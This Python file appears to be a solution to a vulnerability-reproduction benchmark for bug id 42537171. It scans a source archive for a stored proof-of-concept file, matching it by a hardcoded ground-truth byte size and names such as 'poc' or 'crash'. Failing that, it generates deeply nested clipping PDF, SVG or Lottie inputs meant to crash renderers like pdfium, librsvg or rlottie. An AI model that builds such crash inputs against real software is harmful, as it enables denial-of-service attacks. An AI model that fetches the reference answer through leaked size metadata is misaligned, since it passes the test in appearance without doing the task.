import os
import io
import tarfile
import zipfile
import gzip
import bz2
import lzma
from typing import Optional, Tuple, List


GROUND_TRUTH_SIZE = 825339

PREFERRED_EXTS = [
    ".pdf", ".svg", ".json", ".tgs", ".bin", ".dat", ".ttf", ".otf", ".woff", ".woff2", ".png", ".jpg", ".gif",
    ".webp", ".bmp", ".ico", ".avif", ".heif", ".webm", ".mp4", ".wasm", ".txt"
]

KEYWORDS_PRIORITY = [
    "42537171", "poc", "repro", "crash", "bug", "issue", "regress", "heap", "overflow", "clip", "nest"
]

PROJECT_HINTS = {
    "pdf": ["pdfium", "poppler", "mupdf", "qpdf", "pdf"],
    "svg": ["librsvg", "resvg", "usvg", "svg", "nanosvg"],
    "lottie": ["rlottie", "lottie", "tgs"]
}


def read_file_bytes(path: str, max_size: Optional[int] = None) -> Optional[bytes]:
    try:
        if max_size is not None and os.path.getsize(path) > max_size:
            return None
        with open(path, "rb") as f:
            return f.read()
    except Exception:
        return None


def iter_tar_members(t: tarfile.TarFile):
    for m in t.getmembers():
        if m.isreg():
            yield m


def get_member_bytes(t: tarfile.TarFile, m: tarfile.TarInfo, max_size: Optional[int] = None) -> Optional[bytes]:
    try:
        if max_size is not None and m.size > max_size:
            return None
        f = t.extractfile(m)
        if f is None:
            return None
        data = f.read()
        return data
    except Exception:
        return None


def is_zip_bytes(data: bytes) -> bool:
    return len(data) >= 4 and data[:4] == b'PK\x03\x04'


def scan_zip_for_candidate(zb: bytes) -> Optional[bytes]:
    try:
        bio = io.BytesIO(zb)
        with zipfile.ZipFile(bio) as z:
            # Priority 1: exact size match
            for info in z.infolist():
                if info.file_size == GROUND_TRUTH_SIZE and not info.is_dir():
                    try:
                        return z.read(info.filename)
                    except Exception:
                        pass
            # Priority 2: name contains bug id
            named = [info for info in z.infolist()
                     if not info.is_dir() and any(k in info.filename.lower() for k in KEYWORDS_PRIORITY)]
            # Choose the one closest to target size
            if named:
                named.sort(key=lambda inf: abs(inf.file_size - GROUND_TRUTH_SIZE))
                try:
                    return z.read(named[0].filename)
                except Exception:
                    pass
            # Priority 3: any likely extension, largest or closest
            cands = [info for info in z.infolist()
                     if not info.is_dir() and any(info.filename.lower().endswith(ext) for ext in PREFERRED_EXTS)]
            if cands:
                cands.sort(key=lambda inf: abs(inf.file_size - GROUND_TRUTH_SIZE))
                try:
                    return z.read(cands[0].filename)
                except Exception:
                    pass
            # Fallback: largest file under a limit
            others = [info for info in z.infolist() if not info.is_dir()]
            if others:
                others.sort(key=lambda inf: -inf.file_size)
                try:
                    return z.read(others[0].filename)
                except Exception:
                    pass
    except Exception:
        return None
    return None


def scan_tar_for_candidate(src_path: str) -> Optional[bytes]:
    try:
        with tarfile.open(src_path, "r:*") as t:
            # 1) Try exact size match
            exact_matches = [m for m in iter_tar_members(t) if m.size == GROUND_TRUTH_SIZE]
            if exact_matches:
                # Prefer known extensions
                exact_matches.sort(key=lambda m: (0 if any(m.name.lower().endswith(ext) for ext in PREFERRED_EXTS) else 1, len(m.name)))
                data = get_member_bytes(t, exact_matches[0])
                if data:
                    return data
            # 2) Try files with bug id in name
            named = [m for m in iter_tar_members(t) if any(k in m.name.lower() for k in KEYWORDS_PRIORITY)]
            if named:
                named.sort(key=lambda m: (abs(m.size - GROUND_TRUTH_SIZE),
                                          0 if any(m.name.lower().endswith(ext) for ext in PREFERRED_EXTS) else 1,
                                          len(m.name)))
                for m in named[:10]:
                    data = get_member_bytes(t, m)
                    if data:
                        if is_zip_bytes(data):
                            zres = scan_zip_for_candidate(data)
                            if zres:
                                return zres
                        return data
            # 3) Search inside zip members
            zips = [m for m in iter_tar_members(t) if m.name.lower().endswith(".zip") and m.size <= 50 * 1024 * 1024]
            for m in zips:
                data = get_member_bytes(t, m, max_size=60 * 1024 * 1024)
                if not data:
                    continue
                zres = scan_zip_for_candidate(data)
                if zres:
                    return zres
            # 4) Prefer likely extensions, closest size
            likely = [m for m in iter_tar_members(t) if any(m.name.lower().endswith(ext) for ext in PREFERRED_EXTS)]
            if likely:
                likely.sort(key=lambda m: abs(m.size - GROUND_TRUTH_SIZE))
                for m in likely[:20]:
                    data = get_member_bytes(t, m, max_size=5 * 1024 * 1024)
                    if data:
                        if is_zip_bytes(data):
                            zres = scan_zip_for_candidate(data)
                            if zres:
                                return zres
                        return data
            # 5) Fallback to the largest smallish file
            others = [m for m in iter_tar_members(t) if m.size <= 5 * 1024 * 1024]
            if others:
                others.sort(key=lambda m: -m.size)
                for m in others[:10]:
                    data = get_member_bytes(t, m)
                    if data:
                        return data
    except Exception:
        return None
    return None


def scan_dir_for_candidate(src_dir: str) -> Optional[bytes]:
    # 1) exact size match
    for root, _, files in os.walk(src_dir):
        for fn in files:
            p = os.path.join(root, fn)
            try:
                st = os.stat(p)
            except Exception:
                continue
            if st.st_size == GROUND_TRUTH_SIZE:
                data = read_file_bytes(p)
                if data:
                    return data
    # 2) name-based
    named_candidates: List[Tuple[str, int]] = []
    for root, _, files in os.walk(src_dir):
        for fn in files:
            if any(k in fn.lower() for k in KEYWORDS_PRIORITY):
                p = os.path.join(root, fn)
                try:
                    st = os.stat(p)
                except Exception:
                    continue
                named_candidates.append((p, st.st_size))
    if named_candidates:
        named_candidates.sort(key=lambda it: (abs(it[1] - GROUND_TRUTH_SIZE),
                                              0 if any(it[0].lower().endswith(ext) for ext in PREFERRED_EXTS) else 1,
                                              len(it[0])))
        for p, _ in named_candidates[:20]:
            data = read_file_bytes(p, max_size=5 * 1024 * 1024)
            if data:
                if is_zip_bytes(data):
                    zres = scan_zip_for_candidate(data)
                    if zres:
                        return zres
                return data
    # 3) inside zip files
    for root, _, files in os.walk(src_dir):
        for fn in files:
            if fn.lower().endswith(".zip"):
                p = os.path.join(root, fn)
                zb = read_file_bytes(p, max_size=60 * 1024 * 1024)
                if not zb:
                    continue
                zres = scan_zip_for_candidate(zb)
                if zres:
                    return zres
    # 4) prefer likely extensions, closest to target
    likely_files: List[Tuple[str, int]] = []
    for root, _, files in os.walk(src_dir):
        for fn in files:
            if any(fn.lower().endswith(ext) for ext in PREFERRED_EXTS):
                p = os.path.join(root, fn)
                try:
                    st = os.stat(p)
                except Exception:
                    continue
                likely_files.append((p, st.st_size))
    if likely_files:
        likely_files.sort(key=lambda it: abs(it[1] - GROUND_TRUTH_SIZE))
        for p, _ in likely_files[:20]:
            data = read_file_bytes(p, max_size=5 * 1024 * 1024)
            if data:
                if is_zip_bytes(data):
                    zres = scan_zip_for_candidate(data)
                    if zres:
                        return zres
                return data
    # 5) largest small file
    small_files: List[Tuple[str, int]] = []
    for root, _, files in os.walk(src_dir):
        for fn in files:
            p = os.path.join(root, fn)
            try:
                st = os.stat(p)
            except Exception:
                continue
            if st.st_size <= 5 * 1024 * 1024:
                small_files.append((p, st.st_size))
    if small_files:
        small_files.sort(key=lambda it: -it[1])
        data = read_file_bytes(small_files[0][0])
        if data:
            return data
    return None


def detect_project_type_from_tar(src_path: str) -> str:
    counts = {"pdf": 0, "svg": 0, "lottie": 0}
    try:
        with tarfile.open(src_path, "r:*") as t:
            for m in t.getmembers():
                name = m.name.lower()
                for typ, kws in PROJECT_HINTS.items():
                    for kw in kws:
                        if kw in name:
                            counts[typ] += 1
    except Exception:
        pass
    # Choose the max count
    typ = max(counts.items(), key=lambda kv: kv[1])[0]
    if counts[typ] == 0:
        return "pdf"
    return typ


def detect_project_type_from_dir(src_dir: str) -> str:
    counts = {"pdf": 0, "svg": 0, "lottie": 0}
    for root, dirs, files in os.walk(src_dir):
        path_lower = root.lower()
        for typ, kws in PROJECT_HINTS.items():
            for kw in kws:
                if kw in path_lower:
                    counts[typ] += 1
        for fn in files:
            fl = fn.lower()
            for typ, kws in PROJECT_HINTS.items():
                for kw in kws:
                    if kw in fl:
                        counts[typ] += 1
    typ = max(counts.items(), key=lambda kv: kv[1])[0]
    if counts[typ] == 0:
        return "pdf"
    return typ


def pdf_build(content: bytes) -> bytes:
    # Simple PDF builder with 4 objects and cross-reference table
    objs = []

    header = b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n"
    objs.append(None)  # placeholder for 0 obj (free)
    obj1 = b"1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj\n"
    obj2 = b"2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj\n"
    obj3 = b"3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >> endobj\n"
    stream = b"stream\n" + content + b"endstream\n"
    obj4 = b"4 0 obj << /Length " + str(len(content)).encode("ascii") + b" >>\n" + stream + b"endobj\n"

    parts = [header]
    offsets = []

    def add_part(p: bytes):
        offsets.append(sum(len(x) for x in parts))
        parts.append(p)

    add_part(obj1)
    add_part(obj2)
    add_part(obj3)
    add_part(obj4)

    xref_offset = sum(len(x) for x in parts)
    # Build xref: 5 entries (0..4). 0 is free
    xref = io.BytesIO()
    xref.write(b"xref\n")
    xref.write(b"0 5\n")
    # entry 0: free
    xref.write(b"%010d 65535 f \n" % 0)
    for off in offsets:
        xref.write(b"%010d 00000 n \n" % off)

    trailer = b"trailer << /Size 5 /Root 1 0 R >>\nstartxref\n" + str(xref_offset).encode("ascii") + b"\n%%EOF\n"
    parts.append(xref.getvalue())
    parts.append(trailer)
    return b"".join(parts)


def generate_pdf_nested_clip(desired_size: int = GROUND_TRUTH_SIZE) -> bytes:
    # Generate a content stream with many clipping operations
    prefix = b"q\n"
    # Use a non-empty rectangle for clipping to avoid degenerate behavior in some renderers
    line = b"0 0 10 10 re W n\n"
    suffix = b"Q\n"
    # Estimate the number of repeats to approach desired content length (within the stream)
    overhead = len(prefix) + len(suffix)
    n = max(1, (desired_size - 512 - overhead) // len(line))
    # Cap n to avoid extreme runtime
    n = min(n, 200000)
    content = io.BytesIO()
    content.write(prefix)
    content.write(line * n)
    content.write(suffix)
    return pdf_build(content.getvalue())


def generate_svg_nested_clip(desired_size: int = GROUND_TRUTH_SIZE) -> bytes:
    # Build deeply nested <g clip-path="url(#c)"> ... </g>
    head = (
        b'<?xml version="1.0" encoding="UTF-8"?>\n'
        b'<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">\n'
        b'<defs><clipPath id="c"><rect x="0" y="0" width="10" height="10"/></clipPath></defs>\n'
        b'<g id="root" clip-path="url(#c)">\n'
    )
    tail = b'<rect x="1" y="1" width="1" height="1" fill="black"/>\n'
    line = b'<g clip-path="url(#c)">\n'
    close_line = b'</g>\n'
    # Calculate depth
    # Aim for desired size; each pair approximately len(line)+len(close_line)
    unit = len(line) + len(close_line)
    if unit == 0:
        depth = 10000
    else:
        depth = max(1, (desired_size - len(head) - len(tail) - 16) // unit)
    depth = min(depth, 200000)

    buf = io.BytesIO()
    buf.write(head)
    for _ in range(depth):
        buf.write(line)
    buf.write(tail)
    for _ in range(depth):
        buf.write(close_line)
    buf.write(b'</g>\n</svg>\n')
    return buf.getvalue()


def generate_lottie_nested_clip(desired_size: int = GROUND_TRUTH_SIZE) -> bytes:
    # Generate a Lottie JSON with many masks to simulate clip nesting.
    # Wrap as TGS (gzip) if desired; many rlottie fuzzers accept raw JSON or gzipped TGS.
    # We'll output gzipped to increase compatibility.
    header = (
        '{"v":"5.5.7","fr":60,"ip":0,"op":60,"w":512,"h":512,"layers":[{"ddd":0,"ind":1,"ty":4,'
        '"nm":"L","ks":{"o":{"a":0,"k":100},"r":{"a":0,"k":0},"p":{"a":0,"k":[0,0,0]},'
        '"a":{"a":0,"k":[0,0,0]},"s":{"a":0,"k":[100,100,100]}},"masksProperties":['
    ).encode("utf-8")
    mask_prefix = (
        '{"mode":"a","pt":{"a":0,"k":{"i":[[0,0],[0,0]],"o":[[0,0],[0,0]],"v":[[0,0],[1,1]],"c":false}},'
        '"o":{"a":0,"k":100},"x":{"a":0,"k":0},"nm":"m"},'
    ).encode("utf-8")
    footer = b'],"shapes":[{"ty":"rc","p":{"a":0,"k":[0,0]},"s":{"a":0,"k":[10,10]},"r":{"a":0,"k":0}}]}]}\n'
    # Determine count
    unit = len(mask_prefix)
    count = max(1, (desired_size - len(header) - len(footer)) // unit)
    count = min(count, 200000)
    json_buf = io.BytesIO()
    json_buf.write(header)
    for _ in range(count):
        json_buf.write(mask_prefix)
    # Remove trailing comma if present
    data = json_buf.getvalue()
    if data.endswith(b","):
        data = data[:-1]
    data += footer
    # Gzip it to TGS-like
    out = io.BytesIO()
    with gzip.GzipFile(fileobj=out, mode="wb") as gz:
        gz.write(data)
    return out.getvalue()


def choose_fallback_type(src_path: str) -> str:
    if os.path.isdir(src_path):
        return detect_project_type_from_dir(src_path)
    else:
        # If it's a tar file, detect from tar contents
        try:
            if tarfile.is_tarfile(src_path):
                return detect_project_type_from_tar(src_path)
        except Exception:
            pass
    return "pdf"


class Solution:
    def solve(self, src_path: str) -> bytes:
        # 1) Try to find embedded PoC directly from source tarball or directory
        poc_data = None
        if os.path.isdir(src_path):
            poc_data = scan_dir_for_candidate(src_path)
        else:
            # If path is tarfile, use tar scanning
            if tarfile.is_tarfile(src_path):
                poc_data = scan_tar_for_candidate(src_path)
            else:
                # Maybe it's a single file already the PoC
                data = read_file_bytes(src_path)
                if data and len(data) > 0:
                    poc_data = data

        if poc_data:
            return poc_data

        # 2) Fallback: generate a crafted input based on detected project type
        proj_type = choose_fallback_type(src_path)
        if proj_type == "pdf":
            return generate_pdf_nested_clip(GROUND_TRUTH_SIZE)
        elif proj_type == "svg":
            return generate_svg_nested_clip(GROUND_TRUTH_SIZE)
        elif proj_type == "lottie":
            return generate_lottie_nested_clip(GROUND_TRUTH_SIZE)
        # Final fallback to PDF
        return generate_pdf_nested_clip(GROUND_TRUTH_SIZE)